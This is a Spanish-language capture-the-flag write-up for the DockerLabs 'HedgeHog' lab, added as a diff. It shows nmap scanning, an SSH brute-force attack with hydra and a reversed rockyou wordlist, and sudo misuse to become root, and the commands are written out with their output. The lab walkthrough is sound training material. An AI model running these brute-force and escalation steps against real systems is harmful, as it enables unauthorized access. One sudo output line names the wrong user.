@@ -1,0 +1,114 @@
+---
+type: writeup
+title: HedgeHog
+description: Laboratorio para practicar fuerza bruta SSH y escalada de privilegios mediante movimiento entre usuarios.
+lang: es
+draft: false
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: muyfacil
+os: linux
+hints: []
+tags: []
+---
+
+Escaneamos todos los puertos con `nmap` para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allPorts 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+```
+
+Escaneamos los puertos abiertos para encontrar más detalles sobre ellos.
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
+|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Revisamos la web con `curl` para ver que data hay ahí.
+
+```bash
+curl http://172.17.0.2
+```
+
+```plaintext
+tails
+```
+
+Encontramos que solo tiene la palabra `tails`, sospechosamente se traduce como `cola` o algo así, así que vamos a dar vuelta el diccionario `rockyou.txt` para ver si no tenemos que esperar 300.000 millones de años para encontrar la contraseña del usuario `tails` que sospechosamente podría ser el nombre del usuario que necesitamos para acceder por SSH. Googleamos como hacerlo porque nadie nace sabiendo que `tac` es el comando que necesitamos para esto.
+
+```bash
+tac /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt > tails.txt
+```
+
+Ahora sí, ejecutamos hydra para ver si damos con la contraseña en el tiempo que nos queda de vida.
+
+```bash
+hydra -l tails -P tails.txt -I -F ssh://172.17.0.2
+```
+
+```plaintext
+[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
+```
+
+Con la contraseña en la mano nos conectamos por `SSH`.
+
+```bash
+ssh tails@172.17.0.2
+```
+
+Listamos los privilegios que tiene el usuario `tails`.
+
+```bash
+sudo -ll
+```
+
+```plaintext
+User sonic may run the following commands on 222c9a3d0013:
+
+Sudoers entry: /etc/sudoers
+    RunAsUsers: ALL
+    Options: !authenticate
+    Commands:
+	ALL
+```
+
+Genial, podemos ejecutar cualquier comando como el usuario `sonic`. Nos regalamos una bash como el usuario `sonic` y estamos por hoy.
+
+```bash
+sudo -u sonic /bin/bash
+```
+
+Y como podemos ejecutar cualquier comando como el usuario `sonic` procedemos a convertirnos en el usuario `root` así como si nada.
+
+```bash
+sudo su
+```
+
+Verificamos la cuestión con el comando `id`.
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
